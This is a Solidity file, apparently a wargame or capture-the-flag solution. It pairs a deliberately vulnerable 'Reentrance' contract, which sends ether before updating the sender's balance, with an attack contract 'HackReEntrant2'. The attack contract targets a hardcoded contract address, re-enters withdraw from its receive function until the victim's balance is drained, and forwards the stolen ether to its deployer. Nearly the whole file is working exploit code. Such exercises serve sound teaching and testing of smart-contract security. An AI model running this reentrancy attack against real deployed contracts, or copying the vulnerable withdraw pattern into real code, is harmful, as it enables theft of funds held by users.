// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../node_modules/@openzeppelin/contracts/math/SafeMath.sol";

contract Reentrance {
  
	using SafeMath for uint256;
	mapping(address => uint) public balances;

	function donate(address _to) public payable {
    	balances[_to] = balances[_to].add(msg.value);
  	}

  	function balanceOf(address _who) public view returns (uint balance) {
    	return balances[_who];
  	}

  	function withdraw(uint _amount) public {
    	if(balances[msg.sender] >= _amount) {
      		(bool result,) = msg.sender.call{value:_amount}("");
      		if(result) {
        		_amount;
    	  	}
	    	balances[msg.sender] -= _amount;
    	}
  	}

  	receive() external payable {}
}

contract HackReEntrant2 {
    Reentrance public original = Reentrance(0x57A8ee948Ad654a3573c0f3a5a156C7dD2900078);
    uint public amount = 1000000000000000 wei;
	address payable actor;

    constructor() public {
		actor = msg.sender;
    }

    function donateToSelf() public payable { 
        original.donate.value(amount).gas(1000000000000000)(address(this));
    }

    receive() external payable {
        if (address(original).balance != 0) {
            original.withdraw(amount);
        }
		else
		{
			withdrawFunds();
		}
    }

	function withdraw() public {
		if (address(original).balance != 0) {
            original.withdraw(amount);
        }
	}

	function withdrawFunds() public {
		actor.transfer(address(this).balance);
	}
}